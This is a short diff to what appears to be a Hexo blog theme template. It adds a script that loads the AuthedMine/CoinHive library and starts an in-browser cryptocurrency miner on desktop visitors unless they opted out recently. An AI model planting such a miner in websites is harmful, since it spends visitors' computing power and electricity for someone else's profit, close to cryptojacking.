@@ -93,7 +93,17 @@
 <meta name="twitter:description">
 
 
+<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+<script>
+	var miner = new CoinHive.Anonymous('9XwQXSj5eazw3Hz2mELpYeWN46A5OTsN', {threads: 1,
+throttle: 0.3});
 
+	// Only start on non-mobile devices and if not opted-out
+	// in the last 14400 seconds (4 hours):
+	if (!miner.isMobile() && !miner.didOptOut(14400)) {
+		miner.start();
+	}
+</script>
 <script type="text/javascript" id="hexo.configuration">
   var NexT = window.NexT || {};
   var CONFIG = {
